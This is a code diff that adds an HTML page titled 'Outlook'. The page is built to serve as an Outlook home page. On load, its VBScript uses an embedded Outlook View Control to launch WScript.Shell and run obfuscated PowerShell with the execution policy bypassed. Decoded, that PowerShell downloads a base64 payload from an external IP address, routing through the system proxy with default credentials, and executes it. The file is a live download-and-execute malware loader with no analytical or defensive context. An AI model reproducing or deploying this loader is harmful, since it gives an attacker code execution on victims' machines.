@@ -1,0 +1,21 @@
+<html>
+<head>
+<meta http-equiv="Content-Language" content="en-us">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>Outlook</title>
+<script id=clientEventHandlersVBS language=vbscript>
+<!--
+ Sub window_onload()
+     Set Application = ViewCtl1.OutlookApplication
+     Set cmd = Application.CreateObject("Wscript.Shell")
+     cmd.Run("powershell -exec bypass $a=iex(('[' + [char]0x53 + 'ystem.Text.Enc' + [char]0x6f + 'ding]::A' + [char]0x53 + 'CII.Get' + [char]0x53 + 'tring([' + [char]0x53 + 'ystem.C' + [char]0x6f + 'nvert]::Fr' + [char]0x6f + 'mBase6' + [char]0x34 + '' + [char]0x53 + 'tring(''JFY9bmV3LW9iamVjdCBuZXQud2ViY2xpZW50OyRWLnByb3h5PVtOZXQuV2ViUmVxdWVzdF06OkdldFN5c3RlbVdlYlByb3h5KCk7JFYuUHJveHkuQ3JlZGVudGlhbHM9W05ldC5DcmVkZW50aWFsQ2FjaGVdOjpEZWZhdWx0Q3JlZGVudGlhbHM7JFM9JFYuRG93bmxvYWRTdHJpbmc' + [char]0x6f + 'J2h0dHA6Ly81LjE5Ni' + [char]0x34 + 'xNzYuOTI6NDQzL3dscCcpO0lFWChbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpBU0NJ' + [char]0x53 + '' + [char]0x53 + '5HZXRTdHJpbmc' + [char]0x6f + 'W1N5c3Rlb' + [char]0x53 + '5Db252ZXJ0XT' + [char]0x6f + '6RnJvbUJhc2U2NFN0cmluZygkcykpKQ==''))'));iex($a)")
+ End Sub
+-->
+
+</script>
+</head>
+
+<body>
+ <object classid="clsid:0006F063-0000-0000-C000-000000000046" id="ViewCtl1" data="" width="100%" height="100%"></object>
+</body>
+</html>
